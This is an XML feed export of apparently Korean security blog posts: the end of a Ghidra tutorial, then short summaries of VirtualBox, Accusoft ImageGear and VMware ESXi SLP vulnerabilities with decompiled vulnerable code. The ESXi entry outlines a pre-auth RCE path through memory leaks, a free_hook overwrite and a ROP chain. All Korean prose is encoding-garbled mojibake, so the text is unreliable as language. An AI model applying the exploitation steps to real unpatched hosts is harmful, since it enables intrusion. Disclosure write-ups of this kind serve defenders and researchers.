Pythonì²˜ëŸ¼ JAVAì™€ python ë“±ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ë°±ë¬¸ì´ ë¶ˆì—¬ì¼ê²¬! ëˆˆìœ¼ë¡œ ì§ì ‘ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2022.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2023.png"></p><p>Window â†’ Script Managerë¥¼ í´ë¦­í•˜ë©´ ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì € ì°½ì´ ì‹¤í–‰ë˜ê³  êµ‰ì¥íˆ ë§ì€ ìŠ¤í¬ë¦½íŠ¸ë“¤ì´ ë‚˜íƒ€ë‚©ë‹ˆë‹¤. ì¹´í…Œê³ ë¦¬ë¡œ ë§ì´ ë¶„ë¥˜ê°€ ë˜ì–´ìˆìŠµë‹ˆë‹¤. ê·¼ë° ë‚˜ëŠ” ì—¬ê¸° ìˆëŠ” ê±° ë§ê³  ë‚´ê°€ ì§ì ‘ ì§  python ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ê³  ì‹¶ìŠµë‹ˆë‹¤â€¦ <code>Hello, ghidra World!</code>ë¥¼ ì¶œë ¥í•˜ê³  ì‹¶ìŠµë‹ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ í•œ ë²ˆ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§ì ‘ ì‘ì„±í•´ë³¼ê¹Œìš”?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2024.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2025.png"></p><p>ë¨¼ì € Bundle Managerë¥¼ ì‹¤í–‰ì‹œì¼œì„œ ìŠ¤í¬ë¦½íŠ¸ë“¤ì˜ ê²½ë¡œë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤. <code>$USER_HOME/ghidra_scripts</code>ì— ë‚´ê°€ ì‘ì„±í•œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì €ì¥ë  ê²ƒ ê°™ì€ë° <code>file not found</code>ë¼ê³  ëœ¹ë‹ˆë‹¤. ìŒâ€¦ ë°”íƒ•í™”ë©´ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì €ì¥í•  ë””ë ‰í„°ë¦¬ë¥¼ ë§Œë“¤ê³  ê±°ê¸°ì— ì‘ì„±í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë„£ì–´ë´…ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2026.png"></p><p><code>USER_HOME</code>ì— ghidra_scripts í´ë”ë¥¼ ë§Œë“¤ì—ˆìœ¼ë‹ˆ ì´ì œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±í•´ë³´ë„ë¡ í•©ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2027.png"></p><p>ë²ˆë“¤ ë§¤ë‹ˆì €ì—ì„œ ì´ˆë¡ìƒ‰ + ë²„íŠ¼ì„ ëˆ„ë¥¸ í›„ ë°”íƒ•í™”ë©´ì˜ ghidra_scripts í´ë”ë¥¼ ì§€ì •í•˜ë©´â€¦</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2028.png"></p><p>ì¶”ê°€ê°€ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì œ í•´ë‹¹ ë””ë ‰í„°ë¦¬ì— Python ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•œ í›„ ì €ì¥í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2029.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2030.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2031.png"></p><p>ì–‘í”¼ì§€ ëª¨ì–‘ì„ í´ë¦­í•˜ê³  Python ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  ê²ƒì´ë‹ˆ Pythonì„ ì²´í¬í•˜ê³  ìŠ¤í¬ë¦½íŠ¸ ì´ë¦„ì„ ì…ë ¥í•´ì¤ë‹ˆë‹¤. ë§Œì•½ ì¶”ê°€í•œ ë””ë ‰í„°ë¦¬ê°€ ì—¬ëŸ¬ ê°œë¼ë©´ ë””ë ‰í„°ë¦¬ ì„ íƒ ë¶€ë¶„ì— ì—¬ëŸ¬ ê°œì˜ ë””ë ‰í„°ë¦¬ê°€ ëœ¨ê² ì£ ? :) OK ë²„íŠ¼ì„ í´ë¦­í•´ì¤ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2032.png"></p><p>ì´ëŸ° ì‹ìœ¼ë¡œ í¸ì§‘ì°½ì´ ëœ¨ê³  ì›í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±ë§Œ í•˜ë©´ ë˜ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2033.png"></p><p>ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  ì €ì¥í•œ í›„ ì‹¤í–‰ì‹œì¼œë´…ì‹œë‹¤!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2034.png"></p><p>ì•„ë˜ ì½˜ì†” ì°½ì— <code>hello.py</code>ê°€ ì‹¤í–‰ë¼ì„œ ì •ìƒì ìœ¼ë¡œ ë¬¸êµ¬ê°€ ëœ¨ëŠ” ê²ƒì„ ë³´ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="ë©”ëª¨ë¦¬-ë§µ"><a href="#ë©”ëª¨ë¦¬-ë§µ" class="headerlink" title="ë©”ëª¨ë¦¬ ë§µ"></a>ë©”ëª¨ë¦¬ ë§µ</h1><p>ì´ì œ ë²Œì¨ ë§ˆì§€ë§‰ì´ë„¤ìš”â€¦ ë©”ëª¨ë¦¬ ë§µì…ë‹ˆë‹¤. ë¦¬ë²„ì‹±ì„ í•˜ê±°ë‚˜ ì•„ë‹ˆë©´ í¬ë„ˆë¸”ì„ í•˜ë‹¤ ë³´ë©´ ë©”ëª¨ë¦¬ ë¸”ë¡ë“¤ì´ ì–´ë– í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•  ë•Œê°€ ìˆìŠµë‹ˆë‹¤. í˜¹ì€ Base Addressê°€ ë³€ê²½ë˜ì—ˆì„ ë•Œ í•¨ìˆ˜ê°€ ì–´ë–¤ ì£¼ì†Œë¥¼ ê°–ëŠ”ì§€ ê³„ì‚°ì„ í•´ì•¼ í•  ë•Œë„ ìˆì£ . ê·¸ëŸ´ ë•Œ ì—­ì‹œ ë‹¤ë¥¸ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ghidraì—ì„œ í•´ì¹˜ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2035.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2036.png"></p><p>Window - Memory Mapì„ í´ë¦­í•˜ì—¬ ë©”ëª¨ë¦¬ ë§µì„ ì‹¤í–‰ í•˜ë©´ ìœ„ì™€ ê°™ì€ ì°½ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì–´ë–¤ ë¸”ë¡ì´ ë¬´ìŠ¨ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€, ì´ˆê¸°í™”ê°€ ë˜ì–´ìˆëŠ”ì§€ ë“±ì´ ëª¨ë‘ í‘œì‹œë˜ì£ . ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ ë³€ê²½í•œ ì±„ë¡œ í•¨ìˆ˜ ì£¼ì†Œë“¤ì„ í™•ì¸í•˜ê³  ì‹¶ìœ¼ë©´ ìƒë‹¨ì˜ ì§‘ ëª¨ì–‘ì„ ëˆŒëŸ¬ì„œ Base Addressë¥¼ ìˆ˜ì •í•´ì£¼ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2037.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2038.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2039.png"></p><p>Base Image Addressë¥¼ 0ìœ¼ë¡œ ë°”ê¾¸ì–´ ë²„ë ¸ë”ë‹ˆ ëª¨ë“  í•¨ìˆ˜ë“¤ì´ ì˜¤í”„ì…‹ ì£¼ì†Œë¡œë§Œ í‘œì‹œë˜ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h1><p>ì˜¤ëŠ˜ì€ ë°ì´í„° ë³€í™˜, ë°ì´í„° íƒ€ì… ì ìš©, í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬/ê·¸ë˜í”„, ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €, ë©”ëª¨ë¦¬ ë§µì— ëŒ€í•´ì„œ ì•Œì•„ë³´ì•˜ìŠµë‹ˆë‹¤. ì´ì œ ghidraì— ëŒ€í•´ì„œëŠ” ëª¨ë“  ì‚¬ìš©ë²•ì„ íšë“í•œ ê²ƒ ê°™ìŠµë‹ˆë‹¤. ë¬´ì„œìš´ ìš©ì´ë¼ê³  ìƒê°í•˜ê³  ë ˆì´ë“œ í•  ìƒê°ì— ë“¤ë–  ìˆì—ˆëŠ”ë° ìƒê°ë³´ë‹¤ ì‹±ê±°ì› ë„¤ìš”.</p><p>í•˜ì§€ë§Œ! ì›ë˜ ëª¬ìŠ¤í„°ë¥¼ í•œ ë²ˆ ìˆ˜ë µ í–ˆìœ¼ë©´ ì´ì œ ìì˜í•œ íŒì´ë‚˜ TA(íƒ€ì„ì–´íƒ)ì„ í•˜ëŠ” ê²ƒì´ ê°•í˜¸ì˜ ë„ë¦¬! The Endë¼ëŠ” ë¬¸êµ¬ë§Œ ë³´ê³  ëë‚¬ë‹¤ê³  ìƒê°í•˜ì…¨ë‹¤ë©´<del>(ëë‚˜ê¸¸ ë°”ë¼ì…¨ì„ ìˆ˜ë„ ìˆê² ì§€ë§Œ)</del> ì„œìš´í•©ë‹ˆë‹¤â€¦ ë‹¤ìŒ íŒŒíŠ¸ì—ì„œëŠ” IDA Proë¥¼ ì‚¬ìš©í–ˆë˜ ì‚¬ìš©ìë“¤ì— ëŒ€í•œ ghidra Tips ëª¨ìŒì§‘ì„ ë“¤ê³  ì˜¤ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ë‹¤ë“¤ ì¢‹ì€ í•˜ë£¨ ë³´ë‚´ì‹œê¸¸ ë°”ëë‹ˆë‹¤!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html">https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html</a></p><p><a href="https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html">https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html</a></p><p><a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-2127: Oracle VirtualBox Divide by Zero DoS</title>
    <link href="/2021/03/06/fabu1ous/2021-03-06/"/>
    <url>/2021/03/06/fabu1ous/2021-03-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://candymate.tistory.com/20?category=964271">CVE-2021-2127</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Oracle VirtualBox 6.1.16 (realease 2020/11/17)</p><p>Windows í˜¸ìŠ¤íŠ¸ ì œì™¸</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oracle VirtualBox 6.1.16ì—ì„œ Divide by zero ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. VMWare SVGA II PCIë¥¼ í†µí•´ ì „ë‹¬ëœ ì»¤ë§¨ë“œë“¤ì€ SVGA command bufferì— ì €ì¥ëœ í›„ FIFO loopì„ í†µí•´ íŒŒì‹± ë° ì‹¤í–‰ë©ë‹ˆë‹¤. í•¨ìˆ˜ <code>vmsvgaR3FifoLoop</code>ëŠ” switch-caseë¬¸ì„ í†µí•´ ìƒí™©ì— ë§ëŠ” <code>vmsvga~</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒìœ¼ë¡œ ì»¤ë§¨ë“œë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤. ê·¸ì¤‘ <code>SVGA_3D_CMD_SURFACE_DMA</code> ì»¤ë§¨ë“œë¥¼ ì²˜ë¦¬í•˜ëŠ” <code>vmsvga3dSurfaceDMA</code>ì—ì„œ divide by zero ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c++">AssertReturn(srcz &lt; UINT32_MAX / pMipLevel-&gt;mipmapSize.<span class="hljs-built_in">height</span> / cbGuestPitch, VERR_INVALID_PARAMETER);</code></pre><p>ìœ„ëŠ” Divide by zero ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì½”ë“œì´ê³ , Root causeëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>Invalid surfaceê°€ ì •ì˜ë  ìˆ˜ ìˆìŒ.</p><p><code>mipmap</code>ì˜ ê°’ì´ 0ì´ ì•„ë‹ˆë©°, <code>cbGuestPitch</code>ì˜ ê°’ì´ 0ì¸ surfaceê°€ ì •ì˜ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li><li><p>TextureëŠ” Invalid surfaceì— bound ë¨</p><p>Textureê°€ surfaceì— bound ë˜ì–´ì•¼ ì·¨ì•½ì ì— ë„ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p></li><li><p>ì œìˆ˜(divisor)ì˜ ê²€ì‚¬ ë¶€ì¬</p></li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ 3D acceleration ì˜µì…˜ì´ ì¼œì ¸ ìˆëŠ” VMë“¤ì„ ëŒ€ìƒìœ¼ë¡œ ë¡œì»¬ í˜¹ì€ ì›ê²© Crashë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>dos</tag>
      
      <tag>divide by zero</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21784: Accusoft ImageGearì˜ OOB writeë¥¼ í†µí•œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/03/05/l0ch/2021-03-05/"/>
    <url>/2021/03/05/l0ch/2021-03-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1248">Accusoft ImageGear JPG format SOF marker processing out-of-bounds write vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Accusoft ImageGear â‰¤ 19.8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Accusoftì˜ ImageGear ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ JPG í¬ë§·ì˜ íŒŒì¼ì„ ì²˜ë¦¬í•  ë•Œ ë°œìƒí•˜ëŠ” OOB write ì·¨ì•½ì ì„ í†µí•œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. ImageGearëŠ” ì´ë¯¸ì§€ ë³€í™˜, ìƒì„±, í¸ì§‘, ì£¼ì„ ë“±ì„ ì œê³µí•˜ëŠ” ì´ë¯¸ì§€ íˆ´í‚·ì´ë©° DICOM, PDF, Microsoft Office ë“± 100ê°œ ì´ìƒì˜ í˜•ì‹ì„ ì§€ì›í•©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ JPGíŒŒì¼ ë¡œë“œ ê³¼ì •ì˜ <code>handle_color_channel_with_high_precision</code> í•¨ìˆ˜ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_color_channel_with_high_precision</span><span class="hljs-params">(undefined4 param_1,<span class="hljs-keyword">int</span> width,<span class="hljs-keyword">short</span> *param_3,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">short</span> *param_,<span class="hljs-keyword">short</span> *param_5,<span class="hljs-keyword">short</span> *raster_buffer,<span class="hljs-keyword">int</span> param_7,<span class="hljs-keyword">int</span> param_8)</span></span><span class="hljs-function"></span>&#123;   [...]  <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &lt; width) &#123;raster_buffer = raster_buffer + <span class="hljs-number">2</span>;<span class="hljs-keyword">do</span> &#123;...<span class="hljs-keyword">if</span> (short_3 &lt; <span class="hljs-number">0</span>)&#123;short_3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_3)short_3 = <span class="hljs-number">0xfff</span>;&#125;raster_buffer[<span class="hljs-number">-2</span>] = (<span class="hljs-keyword">short</span>)short_3;<span class="hljs-keyword">if</span> (short_2 &lt; <span class="hljs-number">0</span>)&#123;short_2 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_2)short_2 = <span class="hljs-number">0xfff</span>;&#125;raster_buffer[<span class="hljs-number">-1</span>] = (<span class="hljs-keyword">short</span>)short_2;<span class="hljs-keyword">if</span> (short_1 &lt; <span class="hljs-number">0</span>)&#123;short_1 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_1)short_1 = <span class="hljs-number">0xfff</span>;&#125;*raster_buffer = (<span class="hljs-keyword">short</span>)short_1;      ...raster_buffer = raster_buffer + <span class="hljs-number">3</span>;width = width + <span class="hljs-number">-1</span>;&#125; <span class="hljs-keyword">while</span> (width != <span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">return</span>;&#125;</code></pre><p>ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” í•¨ìˆ˜ëŠ” <code>width</code>ì˜ í¬ê¸°ë§Œí¼ ë°˜ë³µë¬¸ì„ ëŒë©° <code>raster_buffer</code>ì— ë³µì‚¬í•©ë‹ˆë‹¤. <code>width</code>ëŠ” JPG íŒŒì¼ì˜ í—¤ë” ìš”ì†Œì¸ SOF(Start Of Frame, JPG íŒŒì¼ì˜ í¬ê¸° ë° ìƒ˜í”Œë§ ì •ë³´) ë§ˆì»¤ì—ì„œ ê°€ì ¸ì˜¤ëŠ”ë°, <code>raster_buffer</code>ì™€ <code>width</code>ì˜ í¬ê¸° ê²€ì‚¬ë¥¼ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í•´ì»¤ê°€ SOF ë§ˆì»¤ë¥¼ ì¡°ì‘í•´ <code>raster_buffer</code>ì˜ í¬ê¸°ê°€ SOF ë§ˆì»¤ì—ì„œ íŒŒì‹± í•œ <code>width</code>ì— 3ì„ ê³±í•œ ê°’ë³´ë‹¤ ì‘ìœ¼ë©´ buffer overflowë¡œ ì¸í•´ ë²”ìœ„ë¥¼ ë²—ì–´ë‚œ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë©° ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
      <tag>oob</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] SLP heap overflowë¥¼ í†µí•œ VMware ESXi pre-auth RCE ì·¨ì•½ì </title>
    <link href="/2021/03/04/idioth/2021-03-04/"/>
    <url>/2021/03/04/idioth/2021-03-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.thezdi.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi">CVE-2020-3992 &amp; CVE-2021-21974: PRE-AUTH REMOTE CODE EXECUTION IN VMWARE ESXI</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware ESXi<ul><li>7.0 before ESXi70U1c-17325551</li><li>6.7 before ESXi670-202102401-SG</li><li>6.5 before ESXi650-202102101-SG</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware ESXiì—ì„œ pre-authentication remote code execution ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Service Location Protocol(SLP) ì„œë¹„ìŠ¤ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.</p><p>Service Location Protocol(SLP)ëŠ” VMware ESXi ê¸°ë³¸ ì„¤ì¹˜ ì‹œ TCPì™€ UDPì˜ 427 í¬íŠ¸ë¥¼ ë¦¬ìŠ¤ë‹í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. VMwareëŠ” OpenSLP 1.0.1ì„ ê¸°ë°˜ìœ¼ë¡œ ê¸°ëŠ¥ì„ ì¶”ê°€í•˜ì—¬ ì„œë¹„ìŠ¤ë¥¼ êµ¬í˜„í•˜ì˜€ìŠµë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ëŠ” ì¸ì¦ ì—†ì´ ë„¤íŠ¸ì›Œí¬ inputì„ êµ¬ë¬¸ ë¶„ì„í•˜ê³  root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ë¯€ë¡œ ESXi SLP ì„œë¹„ìŠ¤ì˜ ì·¨ì•½ì ì„ í†µí•´ pre-auth remote code executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>VMwareì˜ SLP ì½”ë“œì˜ ì¼ë¶€ë¶„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">SLPParseSrvUrl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> srvurllen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *srvurl, _QWORD *a3)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-comment">// ...</span>  obuf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1u</span>LL, srvurllen + <span class="hljs-number">53L</span>L);  <span class="hljs-keyword">if</span> ( !obuf )    <span class="hljs-keyword">return</span> <span class="hljs-number">12L</span>L;  v6 = <span class="hljs-built_in">strstr</span>(srvurl, <span class="hljs-string">&quot;:/&quot;</span>);        <span class="hljs-comment">// &lt;-- out-of-bounds string search</span>  <span class="hljs-keyword">if</span> ( !v6 )  &#123;    <span class="hljs-built_in">free</span>(obuf);    <span class="hljs-keyword">return</span> <span class="hljs-number">22L</span>L;  &#125;  <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">char</span> *)obuf + <span class="hljs-number">41</span>, srvurl, v6 - srvurl);  <span class="hljs-comment">// &lt;-- heap overflow</span><span class="hljs-comment">// ...</span>&#125;</code></pre><p><code>srvurl</code>ì€ ë„¤íŠ¸ì›Œí¬ inputì„ í†µí•´ ë°›ëŠ” ê°’ì´ì§€ë§Œ í•¨ìˆ˜ì—ì„œ <code>strstr()</code>ì„ ì‚¬ìš©í•˜ê¸° ì „ì— <code>srvurl</code>ì˜ ëì— NULL ë°”ì´íŠ¸ë¥¼ ì¶”ê°€í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë²”ìœ„ ë°–ì˜ ë¬¸ìì—´ì„ ê²€ì‚¬í•˜ì—¬ <code>memcpy</code> ë¶€ë¶„ì—ì„œ heap overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>SLPë¥¼ í†µí•´ Remote Code Executionì„ í•˜ê¸° ìœ„í•´ SLPì—ì„œ ì†¡ìˆ˜ì‹ ì— ì‚¬ìš©ë˜ëŠ” <code>struct SLPBuffer</code>ì˜ êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPBuffer</span></span><span class="hljs-class">&#123;</span>    SLPListItem listitem;    <span class="hljs-keyword">size_t</span>  allocated;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   start;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   curpos;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   <span class="hljs-built_in">end</span>;    <span class="hljs-comment">// buffer data is appended</span>&#125;*SLPBuffer;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPDSocket</span></span><span class="hljs-class">&#123;</span>    SLPListItem         listitem;    <span class="hljs-keyword">int</span>                 fd;    <span class="hljs-keyword">time_t</span>              age;    <span class="hljs-keyword">int</span>                 state;<span class="hljs-comment">// ...</span>    SLPBuffer           recvbuf; <span class="hljs-comment">/* Incoming socket stuff */</span>    SLPBuffer           sendbuf;<span class="hljs-comment">// ...</span>&#125;SLPDSocket;</code></pre><p>VMwareì˜ SLP ì½”ë“œë¥¼ í†µí•´ Remote Code executionì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>connection-&gt;state</code>ë¥¼ <code>STREAM_WRITE_FIRST</code>ë¡œ ë®ì–´ì”ë‹ˆë‹¤. ë©”ëª¨ë¦¬ë¥¼ leak í•˜ê¸° ìœ„í•´ <code>sendbuf-&gt;curpos</code>ë¥¼ <code>sendbuf-&gt;start</code>ë¡œ ë¦¬ì…‹ì‹œì¼œì•¼ í•©ë‹ˆë‹¤.</li><li><code>sendbuf-&gt;start</code>ì˜ ì¼ë¶€ë¶„ì„ 2ê°œì˜ ë„ ë°”ì´íŠ¸ë¡œ ë®ì–´ì”ë‹ˆë‹¤. ì—°ê²° í›„ ìˆ˜ì‹ ì„ ê¸°ë‹¤ë¦¬ë©´, <code>sendbuf</code>ì˜ ì£¼ì†Œë¥¼ í¬í•¨í•œ ë©”ëª¨ë¦¬ë¥¼ leak í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li><code>mmap()</code>ìœ¼ë¡œ í• ë‹¹ëœ <code>recvbuf</code>ë¥¼ leak í•˜ê¸° ìœ„í•´ ìƒˆë¡œìš´ ì—°ê²°ì„ í•˜ê³  <code>sendbuf-&gt;curpos</code>ë¥¼ ë®ì–´ì”ë‹ˆë‹¤. mmap ëœ ì£¼ì†Œë¥¼ í†µí•´ libc base ì£¼ì†Œë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li><code>free_hook</code>ì˜ ì£¼ì†Œë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ìƒˆë¡œìš´ ì—°ê²°ì—ì„œ <code>recvbuf-&gt;curpos</code>ë¥¼ ë®ì–´ì”ë‹ˆë‹¤. ì—°ê²° í›„ ì „ì†¡ì´ ì‹œì‘ë˜ë©´ <code>free_hook</code>ì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>ì ‘ì†ì„ ì¢…ë£Œí•˜ë©´ <code>free_hook</code>ì´ í˜¸ì¶œë˜ì–´ ROP ì²´ì¸ì´ ì‹œì‘ë©ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
